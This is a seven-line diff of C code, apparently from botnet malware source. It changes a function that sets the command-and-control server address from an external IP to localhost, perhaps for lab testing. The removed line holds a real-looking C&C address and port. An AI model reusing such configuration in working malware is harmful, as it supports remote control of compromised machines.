@@ -409,7 +409,7 @@ static void resolve_cnc_addr(void)
   //  }
 
     srv_addr.sin_family = AF_INET;
-    srv_addr.sin_addr.s_addr = inet_addr("109.98.208.52"); 
+    srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
     srv_addr.sin_port = htons(60422);
     resolv_entries_free(entries);
 }
